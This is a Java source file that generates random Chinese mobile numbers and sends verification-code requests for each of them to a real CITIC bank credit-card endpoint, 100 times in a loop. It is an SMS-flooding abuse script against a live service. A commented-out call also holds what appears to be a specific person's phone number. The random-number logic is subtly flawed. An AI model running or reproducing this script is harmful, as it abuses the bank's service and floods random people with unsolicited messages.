package pt.mobile.util;

import pt.common.http.util.ClientUtils;

import java.util.Date;

/**
 * Created by ligson on 2016/7/12.
 * e; if(!(/^1[3|4|5|7|8]\d{9}$
 */
public class MobileRandom {
    public static String[] seconds = new String[]{"3","4","5","7","8"};
    public static String randomMobile(){
        StringBuilder builder = new StringBuilder("1");
        int secondIdx = ((int)(Math.random()*4))+1;
        builder.append(seconds[secondIdx]);
        for(int i = 0;i<9;i++){
            int num = (int)(Math.random()*9);
            builder.append(num);
        }
        return builder.toString();
    }
    public static void  send(String mobile){
        String url = "https://creditcard.ecitic.com/citiccard/cardishop/cardInfo.do?func=generatePhoneCode&dom=%3Crequest%3E%3CcardInfo%20type=%22sendMessage%22%20phone=%22"+mobile+"%22/%3E%3C/request%3E";
        ClientUtils.postAndPrint("",url);
    }
    public static void main(String[] args) {
        //send("15910838058");
        for(int i = 0;i<100;i++){
            send(randomMobile());
        }
    }
}
